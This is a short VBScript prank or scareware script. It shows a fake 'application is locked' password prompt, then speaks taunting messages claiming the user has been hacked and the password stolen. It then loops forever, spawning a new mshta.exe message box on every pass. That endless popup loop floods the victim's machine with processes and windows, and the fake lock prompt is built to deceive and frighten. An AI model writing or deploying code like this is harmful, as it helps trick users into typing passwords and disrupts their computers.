Option Explicit
Dim wsh : Set wsh = CreateObject("Wscript.Shell")

Dim passwd
Dim x
x=0

Do While x=0

    passwd=inputbox("This application is locked. Please provide a password to unlock:","Error opening application", "")

    If passwd="" Then

        msgbox "Please provide a password",vbOKOnly+vbCritical

    Else

        x=1
        Set Sapi = Wscript.CreateObject("SAPI.SpVoice")
        Sapi.speak "You've been hacked!"
        Sapi.speak "I've now got your password stored in my database."
        Sapi.speak "And there is nothing you can do about it."
        Sapi.speak "HAHAHAHA! You stupid little human."
        Sapi.speak "Computers are far better, and much more intelligent."
        Sapi.speak "So now go get IT to help you, chicken-little!"

    End If

Loop

Do While x=1
        
    MsgExclamation "YOU'VE BEEN HACKED! CLICK OK TO ACCEPT", "ANGRY ROBOT FROM FAR PLANET"
    
Loop


'Functions for simple no wait message boxes without return values.
Function MsgBlank(m, t)
	wsh.Run "mshta.exe vbscript:Execute(MsgBox("""&m&""",vbOkOnly,"""&t&""")(window.close))"
End Function
Function MsgCritical(m, t)
	wsh.Run "mshta.exe vbscript:Execute(MsgBox("""&m&""",vbCritical,"""&t&""")(window.close))"
End Function
Function MsgInformation(m, t)
	wsh.Run "mshta.exe vbscript:Execute(MsgBox("""&m&""",vbInformation,"""&t&""")(window.close))"
End Function
Function MsgExclamation(m, t)
	wsh.Run "mshta.exe vbscript:Execute(MsgBox("""&m&""",vbExclamation,"""&t&""")(window.close))"
End Function
